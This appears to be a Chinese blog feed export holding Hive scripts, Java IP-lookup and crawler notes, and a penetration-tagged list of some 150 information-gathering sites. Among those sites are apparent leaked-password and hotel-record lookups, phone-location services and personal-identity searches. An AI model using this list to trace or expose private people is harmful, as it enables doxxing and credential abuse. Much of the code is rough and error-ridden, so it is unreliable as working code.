//封装成sh #! /bin/bash source ../config/set_env.sh updateDT=$1 db=&quot;job_002&quot; table_name = &quot;hot_tag_rank&quot; jar_path=&quot;&quot; class_path=&quot;&quot; $HIVE -e &quot; use $db; set hive.execution.engine=tez; //这里是设置引擎 insert overwrite table $table_name partition(dt=$updateDT&apos;) select tag,count(1) as freq from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; and tag != &apos;-&apos; and dt=&apos;$updateDT&apos; group by tag order by freqd desc; &quot; //改bug sh xxxx.sh 20180507 //写入口 [deal]# touch a_main.sh #! /bin/bash #得到当前日期 currentDT=&apos;date+%Y%m%d&apos; echo &quot;currentDT=&quot;$currentDT #将文本文件数据加载到app_tag_meta_info表中 echo &quot;start load data to table process&quot; sh produce_app_tag_meta_info.sh $currentDT echo &quot;end&quot; #生成统计排序的热度标签数据 echo &quot;start insert tag rank data&quot; sh produce_hot_tag_rank.sh $currentDT echo &quot;end&quot; echo &quot;all done!&quot; //next cp hot_tag_rank.sh hot_tag_rank_rcfile.sh #! /bin/bash db=&quot;job_002&quot; table_name=&quot;hot_tag_rank_rcfile&quot; $HIVE -e &quot; use $db; create table $table_name( tag string, freq int ) partitioned by (dt string comment &apos;update date&apos;) STORED AS rcfile; //面向列分组 &quot; # desc hot_tag_rank_rcfile # show create table hot_tag_rank_rcfile [deal]# cp produce_hot_tag_rank.sh produce_hot_tag_rank_rc.sh #! /bin/bash source ../config/set_env.sh updateDT=$1 db=&quot;job_002&quot; output_table_name_1 = &quot;hot_tag_rank_rcfile&quot; input_table_name_1 = &quot;app_tag_meta_info&quot; jar_path=&quot;&quot; class_path=&quot;&quot; $HIVE -e &quot; use $db; set hive.execution.engine=tez; //这里是设置引擎 insert overwrite table $output_table_name_1 partition(dt=$updateDT&apos;) select tag,count(1) as freq from $input_table_name_1 laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; and tag != &apos;-&apos; and dt=&apos;$updateDT&apos; group by tag order by freqd desc; &quot; vi a_main.sh #生成统计排序的热度标签数据 echo &quot;start insert tag rank data&quot; sh produce_hot_tag_rank_rc.sh $currentDT echo &quot;end&quot; //查看变化 //查找rcfile路径 [slave]$ hdfs dfs -ls 路径 出来路径之后在后面输入dt=20180507 出现/dt=20180507/000000_0 //再来一个不是rcfile的路径 再在路径后面输入dt=20180507 也是得到000000_0 //查看里面的内容 # hdfs dfs -text 空间大小 时间 /xxxx/xxx/dt=20180507/* | more rcfile自带压缩。 所以rcfile空间大小要低一些 hive --service rcfilecat /xxxxx/00000_0 //查看里面的内容,但是里面会乱码 一般用select查看]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>大数据</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大数据日志分析学习笔记01--IP地址查找]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-IP%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BE%2F</url>
    <content type="text"><![CDATA[IP地址查找 myhope365.com 大数据日志分析中，经常会根据访问的来源IP地址 来判定该访客的所属省，市，区甚至更精准的位置信息。从而对该访问打上相应的位置标签 现在各大搜索引擎或专门IP服务公司，均提供类似的服务 需求分析： 通过命令行来演示项目效果即可，查找用时要求再ms内完成 IP地址库思考：很多公司在提供相应的服务，说明这方面的服务是有相应的公开数据的，只是细节更新上各有差异 IP地址库开放位置： https://pan.baidu.com/s/1Iu0FrjYIP1QtoL63_w48Ug 899x (失效) 通过相应的地址库搜索或是查找算法，实现给定IP地址，找到其对应位置信息的功能 思路和考点： 思路： 解析提供的地址库字符串，为结构化数据形式 基于结构化数据构建，数据结构，加速给定IP地址的查找速度 封装成相应的工具类API，开放其相应方法，即给定IP地址可以在ms内计算得到其位置信息 考点： 面向对象程序设计 工具类封装与使用写法 文件IO 字符串处理 二分查找 ip地址的不同形式的使用 1.需求说明 2.需求分析 3.方案设计 技术组成：javase编程，IO，二分查找实现 步骤拆解： 1）文件读取，逐行形成IP地址和位置信息的对象 （同事1-0.4h） 2）对象组织成有序数据集合结构 (同事1-0.4h) 3）实现二分查找 (同事1-0.5h) 4）给定IP地址，利用第2，3步，获取其位置 (同事1-0.4h) 5）封装工具类 (同事1-0.2h) 4.开发细节 5.BUG修复，调优 6.上线 com.tl.job002.pojos IPAndLocationPojo(); com.tl.job002.manager DataLoadManager(); DataSearchManager(); com.tl.job002.utils IOUtils(); IPAndLongConverUtil(); public class IPAndLocationPojo implements Comparable&lt;IPAndLocationPojo&gt;{ private String startIp; private String endIp; private String location; private long startIPLong; private long endIpLong; @Override public int compareTo(IPAndLocationPojo o){ return this.endIpLong - o.startIpLong &gt; 0 ? 1 : 0; } public IPAndLocationPojo(xxx){ super(); xxx this.startIPLong = IPAndLongConverUtil.ipToLong(startIp); this.endIPLong = IPAndLongConverUtil.ipToLong(endIp); } setter and getter } public class DataLoadManager{ public static List&lt;IPAndLoacationPojo&gt; getPojoList(List&lt;String&gt; ipAddressList){ for(String line:ipAddressList){ line = line.trim(); if(line.length()==0){ continue; } String columnArray = line.split(&quot;\t&quot;); if(columnArray.length!=3){ continue; } IPAndLocationPojo pojo = new IPAndLocationPojo(columnArray[0],columnArray[1],columnArray[2]); pojoList.add(pojo); } return pojoList; } public static List&lt;IPAndLoacationPojo&gt; getPojoList(String ipPath){ //把文本文件加载到内存的字符串集合中 List&lt;String&gt; lineList = IOUtil.getLineList(ipPath,&quot;UTF-8&quot;); //把String集合解析成对应的集合对象 List&lt;IPAndLocationPojo&gt; pojoList = new ArrayList&lt;IPAndLocationPojo&gt;(); return pojoList; } psvm(){ String ipAddressSource = &quot;/usr/bin/xxx.txt&quot;; List&lt;IPAndLocationPojo&gt; pojoList = getPojoList(ipAddressSource); sout(pojoList.size()); } } public class IOUtil{ public static List&lt;String&gt; getLineList(String txtFilePath,String encoding) throws Exception{ FileInputStream fis = new InputStream(ipAddressSource); InputStreamReader isr = new InputStreamReader(fis,&quot;utf-8&quot;); BufferedReader br = new BufferedReader(isr); String line = null; List&lt;String&gt; lineList = new ArrayList&lt;String&gt;(); while((line=br.readLine())!=null){ lineList.add(line); } br.close(); return lineList; } } public class DataSearchManager{ private IPAndLocationPojo[] sortedPojoArray = null; public DatatSearchManager(String idAddressLib){ List&lt;IPAndLocationPojo&gt; pojoList = DataLoadManager.getPojoList(idAddressLib); pojoArray = new IPAndLocationPojo[0]; pojoArray = pojoList.toArray(); } //简单测试二分查找 public static int getIndexByBinarySearch(int[] sortedArray,int startPos,int endPos,int aid){ if(startPos&lt;0 || endPos&gt;sortedArray.length || startPos &gt; endPos){ return false; } int middle = (startPos + endPos)/2; if(aid&gt;sortedArray[middle]){ startPos = middle + 1; return getIndexByBinarySearch(sortedArray,startPos,endPos,aid); }else if(aid&lt;sortedArray[middle]){ endPos = middle -1; return getIndexByBinarySearch(sortedArray,startPos,endPos,aid); } return middle; } //对象二分查找 public int getIndexByBinarySearch(int[] sortedArray,int startPos,int endPos,long ipLong){ if(startPos&lt;0 || endPos&gt;sortedArray.length || startPos &gt; endPos){ return false; } int middle = (startPos + endPos)/2; if(ipLong&gt;sortedArray[middle].getEndIpLong()){ startPos = middle + 1; return getIndexByBinarySearch(sortedArray,startPos,endPos,ipLong); }else if(aid&lt;sortedArray[middle].getStartIPLong()){ endPos = middle -1; return getIndexByBinarySearch(sortedArray,startPos,endPos,ipLong); } return middle; } //封装： public String getLocationByIPString(String ip){ int startPos = 0; int endPos = pojoArray.length - 1; String ip = &quot;1.27.248.0&quot;; Long aidToLong = IPAndLongConvertUtil.ipToLong(ip); int pos = getIndexByBinarySearch(pojoArray,startPos,endPos,aid); if(pos &gt; -1){ return pojoArray[pos].getLocation(); } return null; } psvm(){ String ipAddressSource = &quot;&quot;; String ip = &quot;1.27.233.255&quot;; DataSearchManager dsm = new DataSearchManager(ipAddressSource); long startTS = System.currentTimeMillis(); String location = dsm.getLocationByIPString(ip); long endTS = System.currentTimeMillis(); sout(endTS-startTS); } psvm(){ int[] sortedArray={1,3,5,7,11,20,30,44,55}; int startPos = 0; int endPos = sortedArray.length - 1; int aid = 1; int index = getIndexByBinarySearch(sortedArray,startPos,endPos,aid); sout(index); } } maven打包: 如果项目不是maven，则右键项目-&gt;configure-&gt;convert to Maven project &lt;sourceDirectory&gt;src&lt;/sourceDirectory&gt; &lt;!-- 意思是打的src下的包--&gt; plugins： &lt;plugin&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;!-- 意思是用这个插件来打,target是1.7的版本 --&gt; &lt;version&gt;2.3.2&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;1.7&lt;/source&gt; &lt;target&gt;1.7&lt;/target&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt; jar-with-dependencies &lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;!-- 这里指定打包的主类 --&gt; &lt;archive&gt; &lt;manifest&gt; &lt;!-- 主函数入口 --&gt; &lt;mainClass&gt;com.tl.job001.controler.SystemController&lt;/mainClass&gt; &lt;/manifest&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;make-assembly&lt;/id&gt; &lt;!-- 意思是用assembly方式来打包 --&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;assembly&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; 然后项目-&gt;右键-&gt;Run As-&gt;Maven install 一个jar包，一个allinone的包 java -cp ?]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>大数据</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集网址大全01]]></title>
    <url>%2F2018%2F09%2F10%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E5%9D%80%E5%A4%A7%E5%85%A801%2F</url>
    <content type="text"><![CDATA[一、查企业查信用 1、信用中国 http://www.creditchina.gov.cn/ 2、全国企业信用信息公示 http://gsxt.saic.gov.cn/（导航） http://gsxt.saic.gov.cn/zjgs/（总局） 3、信用导航 http://www.creditchina.gov.cn/toNavigation 4、企信宝 http://www.qixin.com/ 5、企业信用信息查询APP http://www.ixy360.com/ 6、企查查 http://www.qichacha.com/ 7、企业云数据征信中心 http://www.xinyong****15.com/ 8、天眼查 http://www.tianyancha.com/ 9、信用视界 http://www.x315.com/ 全球企业信息 10、悉知 http://www.xizhi.com/ 国内企业信息含联系方式经营范围 11、发改委信用信息查询 http://credit.ndrc.gov.cn/XYXX/admin_client/form_designer/ttt/index.html 12、重大税收违法案件信息 http://hd.chinatax.gov.cn/xxk/ 13、进出口信用信息公示查询 http://credit.customs.gov.cn/ 14、网站信用信息查询 http://www.itrust.org.cn/home/index/xy_search.html 15、建筑市场监管与诚信信息发布平台 http://www.mohurd.gov.cn/docmaap/ 16、中国裁判文书网 http://wenshu.court.gov.cn/ 17、全国法院被执行人信息查询 http://zhixing.court.gov.cn/search/ 18、执行信息公开网 http://shixin.court.gov.cn/ 19、人民检察院案件信息公开网 http://www.ajxxgk.jcy.cn/html/index.html 20、全国法院减刑、假释、暂予监外执行信息网 http://jxjs.court.gov.cn/ 21、中国涉外商事海事审判网 http://www.ccmt.org.cn/cpws.php 22、中国知识产权裁判文书网 http://ipr.court.gov.cn/ 23、北大法宝 http://www.pkulaw.cn/Case/ 24、建筑企业查询 http://www.mohurd.gov.cn/wbdt/dwzzcx/index.html 工程设计、监理、建筑业企业、项目招标代理、城市规划、造价咨询、房地产开发企业 25、组织机构代码查询 http://www.nacao.org.cn/publish/main/5/index.html 26、工业产品生产许可获证企业查询 http://www.aqsiq.gov.cn/search/gyxkz/ 27、域名信息备案管理系统 http://www.miitbeian.gov.cn/publish/query/indexFirst.action http://whois.chinaz.com/ 28、全国民间组织查询 http://www.chinanpo.gov.cn/search/searchOrgList.do?action=searchOrgList 二、政府信息公开查询 29、国务院各部门行政许可事项查询服务 http://spgk.scopsr.gov.cn/pages/sgyj/index1.jsp 30、交通运输部综合查询 http://www.moc.gov.cn/chaxunfuwu/ 31、证监会信息公开 http://www.csrc.gov.cn/pub/zjhpublic/index.htm?channel=3300/3619 32、水利部综合查询 http://www.mwr.gov.cn/zxfw/zhcxfwpt/ 33、金农一期互联网应用系统 http://www.moa.gov.cn/jnyy/ 34、财政部在线查询 http://www.mof.gov.cn/zaixianfuwu/zxcx/ 35、人力资源保障部查询 http://www.mohrss.gov.cn/SYrlzyhshbzb/fwyd/zaixianchaxun/ 36、国土资源公开公示 http://www.mlr.gov.cn/zwgk/ 37、中国商品信息验证中心 http://www.china3-15.com/ 38、国家兽药基础信息查询 http://sysjk.ivdc.org.cn:8081/cx/ 39、海关总署综合查询 http://www.customs.gov.cn/publish/portal0/tab9372/ 40、国家质检总局综合查询 http://www.aqsiq.gov.cn/zhcx/ 三、身份信息查询 41、国家职业资格证书查询 http://zscx.osta.org.cn/ 42、国家职业能力证书查询 http://nlzs.osta.org.cn/ 43、会计资格查询 http://60.208.116.167/pas/querycert.jsp 44、注册会计师查询 http://cmispub.cicpa.org.cn/cicpa2_web/public/query0/2/00.shtml 45、全国技工院校毕业证书查询 http://www.jxzs.mohrss.gov.cn/ 46、国际证书查询 http://gjzs.osta.org.cn/ 47、纳税人查询 http://hd.chinatax.gov.cn/fagui/action/InitCredit.do 48、交通部执业资格证书查询 http://www.jtzyzg.org.cn/common/zszxdt/index.html 49、船员证书查询 http://cyxx.msa.gov.cn/lycx/zslycx!init.action?flag=1 http://www.cnss.com.cn/index.php?m=resource&amp;amp;c=sailor_certificate 50、社保基金监督检查证查询 http://59.252.162.99/ 51、人民银行征信中心 http://www.pbccrc.org.cn/ 52、特种设备作业人员查询 http://hr.cnse.gov.cn/ 53、执业医师查询 http://zgcx.nhfpc.gov.cn/doctorsearch.aspx 54、执业护士查询 http://zgcx.nhfpc.gov.cn/nursesearch.aspx 55、建筑执业查询 http://www.pqrc.org.cn/query.aspx 56、保险执业查询 http://iir.circ.gov.cn/ 57、律师执业查询 http://chaxun.lawyercom.cn/ 58、教师资格网 http://static.jszg.edu.cn/public/tongzhi.html 59、学历学籍查询 http://www.chsi.com.cn/xlcx/index.jsp http://www.chsi.com.cn/xlcx/bgcx.jsp#学籍/学历在线验证?cata=2147438794 http://www.chsi.com.cn/xlcx/#高等教育学历证书查询?cata=2147438794 https://account.chsi.com.cn/passport/login?service=http%3A%2F%2Fmy.chsi.com.cn%2Farchive%2Fj_spring_cas_security_check#高等教育学籍查询?cata=2147438794 60、“三支一扶”大学生信息查询 http://szyf.chrm.gov.cn/default.aspx 61、证券从业人员查询 http://person.sac.net.cn/pages/registration/sac-publicity-report.html 62、银行业从业资格查询 http://www.ccbp.org.cn/chaxun/ 63、造价员查询 http://zjybm.jianshe99.com/costweb/publichPortalLogin/view.do?op=goPublichPortalLoginInit 64、房地产估价师查询 http://xhzhglxt.cirea.org.cn/website/gjs_Iframe.asp 65、社保公积金医保查询 http://m.****33sb.com/ 66、社保查询 http://wsfw.hs****33.gov.cn/ 67、活佛查询系统 http://hf.tibet.cn/ 68、导游信息查询 http://daoyou-chaxun.cnta.gov.cn/single_info/selectlogin_1.asp 69、内蒙古低保信息查询 http://www.nmmztywpt.com/nmdb/web/xxgs_cx.jsp 70、在职硕士查询 http://zzcx.eol.cn/ 71、上海健康证查询 http://www.jkz.sh.cn/ 72、全国民办高校学生信息查询 http://www.cxedu.org.cn/xsxjcx.asp 73、身份证信息泄露核查 http://d.id5.cn/desktop/index.jsp 74、邮政职业证书查询 http://zyjd.spb.gov.cn/ 75、测绘职业资格证书查询 http://zjzx.sbsm.gov.cn/zyzgzscxxt/ 76、记者证查询 http://press.gapp.gov.cn/ 77、记者违规违纪查询 http://press.gapp.gov.cn:8088/press_search/pages/query/queryAction!findBadRecordPaging.action?badType=1 78、全国广播电视编辑记者、播音员主持人资格考试 http://211.146.5.61:7001/gdexam/public/cjcx3.jsp 79、审计职称查询 http://www.audit.gov.cn/n8/n29/index.html 80、运动员技术等级综合查询 http://jsdj.sport.gov.cn/ 81、国家知识产权人才信息查询 http://211.157.104.94:8080/expert/view/person.jhtml 四、驾驶员及车辆信息查询 82、驾驶证行驶证身份证查询 http://www.bitauto.com/weizhang/jiashizheng/suining.html 83、交通违章查询 http://www.weizhang8.cn/ http://chaxun.weizhang8.cn/guanfangwang.php http://www.weizhangwang.com/ http://www.weizhangjilu.com/ http://wz.ieche.com/jtwz.asp http://wz.ieche.com/ http://cha.chelink.com/ 84、车险理赔系统网址 http://www.nia.net.cn/lp_service.asp 85、车险理赔信息查询系统 http://www.bjcxlp.com.cn/ 五、查物品查资产 86、土地市场信息查询 http://www.landchina.com/ 87、专利检索 http://www.sipo.gov.cn/zljsfl/ 88、金马甲资产交易查询 http://www.jinmajia.com/xmjs/ 89、淘宝司法拍卖 https://sf.taobao.com/ 90、条码信息查询 http://www.ancc.org.cn/Service/queryTools/Barcode.aspx 91、中国物品编码中心 http://www.ancc.org.cn/ 92、国际和国内船舶查询 http://www.ccs.org.cn/ccswz/font/fontAction!moudleIndex.do?moudleId=78 93、中国海事船舶查询系统 http://app.cnss.com.cn/sochuan.php 94、房产证查询 http://www.51zzl.com/rcsh/fcz.asp 95、土地证查询 http://www.51zzl.com/jinrong/tudizheng.asp 六、查物流 96、海关电子放行信息查询 http://edi.easipass.com/dataportal/q.do?qn=dp_query_letpas 97、快递物流查询 http://www.56888.net/comm/kuaidi.aspx http://www.spb.gov.cn/yzbmcx/ http://www.ckd.cn/ 七、查发票 98、友商发票查询 http://fapiao.youshang.com/ 99、走114 各地查询链接 http://www.zou114.com/invoice/ 100、114啦 各地查询链接 http://www.114la.com/other/fapiaozw.htm 101、在线查询网 http://fapiao.supfree.net/ 友商数据接口在线查询 102、百度应用 百度搜索中输入：发票真伪查询 可进入查询应用 八、查金融 103、银行卡开户地查询 http://cha.yinhangkadata.com/ 104、中国支付网 http://paynews.net/ 银行卡bin查询、第三方支付机构查询 105、posp.cn http://posp.cn/ 联行号查询、银行卡归属地查询 106、爆料迷支付网 http://cha.baoliaomi.com/ 联行号查询、支付牌照查询、二清pos查询、银行卡bin查询、mcc查询、收单机构号查询、pos代理商查询 107、全民114网 http://www.pplive114.com/ 银行网点查询 108、ATM机网点查询网 http://www.atmji.com/ ATM机网点查询 109、中国银联ATM查询 http://www.unionpayintl.com/cn/serviceCenter/atmResult/ 110、银行网点通 http://www.yhwdt.com/ 行号查询、网点查询 111、爱查网 http://www.2cha.com/ 银行卡归属地查询、手机归属地查询、ip查询 112、银行卡归属地批量查询 http://www.yinhangkadata.com/ 银行卡归属地数据接口、银行卡归属地批量查询软件下载、银行卡归属地在线查询 113、posmcc pos机商户代码查询 http://www.posmcc.com/ 114、pos商户代码查询app下载 http://www.wandoujia.com/apps/com.uuwee.quickmcc 九、查手机 115、爱查（手机、银行卡归属地） http://www.2cha.com/ 116、虚拟运营商查询 http://17000.net.cn/ 117、170手机归属地查询 http://www.im170.com/mobile.html http://www.100170.net/ 118、注册过哪些网站 http://www.zhaohuini.com/ 119、基站查询 http://www.cellid.cn/ http://www.haoservice.com/freeLocation/ http://lbs.juhe.cn/cellmap/ http://www.minigps.net/cellsearch.html http://www.cellmap.cn/page/webgsm2gps.aspx 120、经纬度查询 http://www.gpsspg.com/maps.htm http://map.yanue.net/ http://www.gzhatu.com/jingweidu.html 121、果粉查询 http://www.guofenchaxun.com/iccid/ 122、找果网 http://iccid.zhaoiphone.com/ ****、果粉工具箱 http://iccidchaxun.com/ 124、卡神查询 http://www.chaiccid.com/ 125、手机串号IMEI查询 http://www.numberingplans.com/?page=analysis&amp;amp;sub=imeinr http://www.imei.info/ http://www.imei8.net/ http://www.imeidb.com/ http://www.chalg.com/ http://www.samsung110.com/ http://www.chahtc.com/ 126、百度号码认证平台 http://haoma.baidu.com/query 127、搜狗号码认证平台 http://haoma.sogou.com/rz/ 128、360手机归属地查询 http://cx.shouji.360.cn/ 129、触宝通讯录 http://www.chubao.cn/dialer/index.html 130、电话邦 http://www.dianhua.cn/ 131、电话万能钥匙 http://www.imcaller.com/ 132、腾讯手机管家 http://m.qq.com/download/ 133、刑部11司 http://cop163.com/ 134、领英 https://www.linkedin.com/ 十、查密码查开房 135、查小米 http://mi.ckaifang.com/ 136、sgk98 http://www.sgk98.com/ 137、守夜人 http://www.shouyeren.org/ 138、嗅密码 http://www.xiumima.com/ 139、tasec http://www.tasec.org/ 140、华西安全网 http://cha.hx99.net/ 141、听云 http://tingyun.org/ 十一、采集搜索 142、搜索引擎大全 http://www.sowang.com/link.htm 143、特百度 http://www.tebaidu.com/ 144、虫部落快搜 http://so.chongbuluo.com/ 145、八爪鱼 http://www.bazhuayu.com/download 146、数多多 http://www.dataduoduo.com/?bzy=home 147、114搜索 http://www.114.org/ 148、微信搜索 http://weixin.sogou.com/ 149、人物关系搜索 http://www.sogou.com/tupu/person.html 150、伪基站检测软件下载 https://security.tencent.com/index.php/opensource/detail/10 社会工程学(与人交互) 与人交流的社会工程学]]></content>
      <categories>
        <category>网站/论坛/信息</category>
        <category>信息</category>
        <category>信息收集</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>信息收集</tag>
        <tag>威胁情报</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[天亮爬虫学习笔记03]]></title>
    <url>%2F2018%2F09%2F10%2F%E5%A4%A9%E4%BA%AE%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003%2F</url>
    <content type="text"><![CDATA[分布式爬虫 中级版-问题列表-待完善 1.UI 1.1 数据来源不够丰富，目前来源于文件不够灵活。 增加来源： 1)数据库可以添加 2）web界面可以自由添加任务 2.TaskSchedule 2.1 恢复机制进行升级解耦，用redis作为中间存储解耦 恢复机制很麻烦，是由于解耦不当造成的，需要持久化的数据放到了第三方内存数据库中 比如：doneURL,doneTask等都放到了内存中，导致关机或是重启进程均丢失 故要将该性质的数据进行独立存储，则关机或关进程就不需要恢复了 之前的schedule：1）由UIManager存入任务，形成任务池，然后其依据FIFO策略，将任务分发给下载线程。（但由于项目本身的特点，5个页面的url一直是可以快速循环迭代的，所以不必要进行恢复） 2）saveNewsEntityUrlSet：存储历史已入库任务的URL记录，用来作为数据入库时候的判重set使用。 3）监控日志中的当天共采集多少条数据，以及历史共采集多少条数据 持久化中间件选择： 1）mysql：关系型数据库，查询相对较慢，对数据库压力也大 2）redis：内存型数据库，查询块，无压力 1）进程内存和redis各放一份同等的数据，由内存往redis里同步数据 优点：1））简化了恢复过程 缺点：1））同步需要周期，中间会有丢失数据的可能性。如果宕机的话会丢失数据。 2））还依然需要恢复数据到进程内存，因为实际使用还是进程内存的数据 2）直接放在redis中，不在进程内存中放 优点：简单设计简洁 缺点：1））与redis直接通讯效率会低于进程自身内存 2））redis的IO请求会显著提高。会产生一定的redis请求压力 3.Download 3.1 解耦调用流程 将原先的download--&gt;parser--&gt;persistence 改为download--&gt;parser,并将persistence独立出来。 3.2 分布式爬虫 1）由多个独立的进程共同完成一件事情 2）分布式爬虫的设计 *1）master/slave 角色定义/角色称呼 角色对应的功能： master：UIManager，TaskSchedule，PersistenceManager slave：DownloadManger，ParserManager middleware(中间件) 第1个：作为中间媒介人,用来存储master需要下放给slave的任务列表。 第2个：用来存储slave给master返回的解析完的结果对象（NewsItemEntity) *2）无中心化/去中心化 4.Parser 4.1 正则，Jsoup工具类 4.2 新增三个字段：标题，发布时间，URL，作者，来源，正文 则最终成为7个字段，分别为：标题，发布时间，URL，作者，来源，正文，插入时间 差异点： 之前是种子任务，现在是两种任务，一个是种子任务，一个是要采集出来的真正的实体数据 第1种设计方法： 两种任务对于TaskSchedule来讲，相当于平行复制了一份，里面的对象发生了改变 相当于两个池子，分发的时候各自去取不同种类的任务去下载，在解析的时候也要有区分，以及是不是要存储 第2种设计方法： 将2种任务化简成主线程单线程完成种子任务采集，由后边的多线程完成实体数据的采集。 5.Persistence 5.1 mysql版 5.2 elasticsearch版 WebSpiderAdvanced4job001 复制过来之后要修改git 在网页重新搞一个project，然后项目右键-&gt;team-&gt;share.... 然后commit的时候把.文件都不选，其他都选然后注释，commit com.tianliangedu.job001.controller SystemController(); com.tianliangedu.job001.iface.download com.tianliangedu.job001.iface.parser com.tianliangedu.job001.iface.persister DataPersistManager(); //数据持久化管理器 com.tianliangedu.job001.monitor com.tianliangedu.job001.parser com.tianliangedu.job001.persistence com.tianliangedu.job001.pojos com.tianliangedu.job001.pojos.entity com.tianliangedu.job001.schedule com.tianliangedu.job001.ui com.tianliangedu.job001.utils public class SystemController{ //将log4j配置文件放到jar包外边的路径更新 static{ PropertyConfigurator.configure(System.getProperites); } logger //主线程任务采集 psvm(){ //1.起动UIManager,注入种子任务 //2.起动下载程序，解析 //3.起动系统监控管理器 //周期执行 } //addSeedUrlsToTaskSchedule(){ //将给定的种子任务先进行采集和解析，将二级任务传递给任务管理器，去调度 parseSeedUrlsTaskToSchedule(){ //定义种子文件路径 String datafilePath = &quot;&quot;; //将种子任务从种子任务中读取出来，形成种子任务集合 List&lt;UrlTaskPojo&gt; seedUrlPojoList = UIManager(xxx); //将任务不直接放调度器，而是先逐个种子url采集和解析，将解析出来的子任务再添加到TaskSchedule里面去。 for(UrlTaskPojo urlTaskPojo:seedUrlPojoList){ //遍历集合，拿到每一页的URL封装的对象 String htmlSource = downLoadInterface.download(urlTaskPojo.getUrl()); List&lt;NewsItemEntity&gt; itemEnityList = xxparser; for(NewsItemEntity itemEntity:itemEnityList){ sout(itemEntity.toString()); } } } } UIManager{ //实例化一个网页下载接口的实现类，单线程 DownLoadInterface .... start(); } public class DataPersistManager{ //将实现类初始化 public static DataPersistentceInterface persistenceInterface = new DataPersist4MysqlImpl(); public static boolean persist(List&lt;NewsItemEntity&gt; itemList){ boolean flag = persistenceInterface.persist(itemList); } } UrlTaskPojo{ //new private TaskTypeEnum taskType = TaskTypeEnum.ROOT_URL;//默认是根url public static enum TaskTypeEnum{ ROOT_URL,CRAWL_TASK } } HtmlParserManager{ List&lt;UrlTaskPojo&gt; parserHtmlSource4rootUrl(){ return xxx } } NewsItemParserInterface{ //new public List&lt;NewsItemEntity&gt; parserHtmlSource4rootUrl(); } 分布式设计方法： redis： TaskScheduleManager: savedNewsEntityUrlSet pom.xml &lt;!-- https://mvnrepository..... --&gt; redis.clients jedis 2.8.2 RedisOpenUtil{ private Jedis jedis; public static RedisOpenUtil getInstance(){ return new redisOpenUtil = new RedisOpenUtil(xxxx); } setter and getter public RedisOpenUtil(String ip,int port,String password){ //连接本地的Redis服务 jedis = new Jedis(ip,port); jedis.auth(password); } public Jedis getJedis(){ retrun jedis; } public String get(String key){ String val = jedis.get(key); if(val == null){ val = &quot;xxx&quot;; } return val; } public void set(String key,String value){ jedis.set(key,value); } psvm(){ String ip =. int port password RedisOpenUtil redisOpenUtil.set(xx); sout(jedis.ping()); //结果为PONG则是通的 sout(); } } spider.properties: #redis配置参数 redis_ip=xxx redis_port=6379 redis_password=xxx SystemController 静态声明调用配置文件 TaskScheduleManager: //redis工具类初始化 public static RedisOpenUtil redisOpenUtil = RedisOpenUtil.getInstance(); addSavedNewsEntityUrlSet(xx){ redisOpenUtil.getJedis().sadd(uniqUrlSetKey,savedUrl); //getJedis().sismember. 判断key，value是不是在库里面 } //取得其长度 getSavedNewsEntityUrlSetSize(){ getJedis().scard(key); } 缓存穿透： 1.缓存没有命中 原因：往往是缓存冷启动问题；（第一次起动） 解决方法：预计算 缓存不一致： 1.缓存数据与你的之前一般持久化数据不一致了。 原因：代码有bug 清空数据之类的人为导致两者不一致了 分布式设计： spider.properties #定义是master还是slave节点：true是master is_master=true SystemConfigParas 读取爬虫节点角色 boolean is_master SystemController //在第一步之前 if(SystemConfigParas.is_master){ //主节点 //启动系统监控管理器 //周期执行 int circleCounter = 1; while(true){ //添加任务 } }else{ //子节点 //启动下载进程 } TaskScheduleManager //redis中与队列对应的list结构的key声明： public static String todoTaskPojoListKey = &quot;todo_task_pojo_list_key&quot;; redisOpenUtil.getJedis().lpush(); ObjectAndByteArrayConvertor: java对象与字节数组的转化工具类 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(urlTaskPojo); oos.flush(); byte[] objByteArray = baos.toByteArray(); addUrlTaskPojoList(List&lt;UrlPojo&gt; todoAddTaskList){ //将对象转成byte数组存到redis中 for(xx xxx: xxList){ byte[] byteArray = ToByteArray(xxx); redisOpenUtil.getJedis().lpush(todoTaskPojoListKey.getBytes(&quot;utf-8&quot;,byteArray)); } } UrlTaskPojo implements Serializable{//序列化标志口 } es实现： DataPersist4Esimpl persist(对象类){ } pom.xml 5个依赖: esxxx log4j sl4j io.search ... log4j.proerties log4j2.proerties 工具类： TransportClientUtil{ //声明一个client变量 public TransportClient client = null; public TransportClientUtil() throws Exception(){ init(); } //初始化TransportClient public void init() throws Exception(){ 